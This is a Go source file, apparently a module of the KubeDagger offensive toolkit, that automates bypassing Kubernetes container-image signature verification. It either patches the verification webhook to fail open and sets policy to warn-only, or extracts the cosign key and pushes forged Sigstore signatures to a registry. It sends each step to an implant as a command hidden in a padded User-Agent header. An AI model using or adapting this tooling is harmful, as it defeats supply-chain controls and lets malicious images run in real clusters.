package sig_bypass

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type BypassResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, mode, targetImage, output string) error {
	result := &BypassResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch mode {
	case "disable-verify":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_webhook", "locate image verification admission webhook configuration", "sig_find_webhook"},
			{"patch_webhook", "modify webhook failurePolicy to Ignore via API patch", "sig_patch_webhook"},
			{"disable_policy", "set ClusterImagePolicy to warn-only mode", "sig_disable_policy"},
			{"verify_bypass", "confirm unsigned images now pass admission", "sig_verify_bypass"},
		}
	default: // inject-sig
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"extract_pubkey", "extract trusted signing public key from cosign verification secret", "sig_extract_key"},
			{"generate_sig", "create forged Sigstore signature bundle for target image digest", "sig_generate"},
			{"upload_sig", "push forged signature to OCI registry as cosign attachment", "sig_upload"},
			{"verify_acceptance", "confirm image now passes signature verification", "sig_verify"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + mode + "#" + targetImage
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/sig_bypass", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
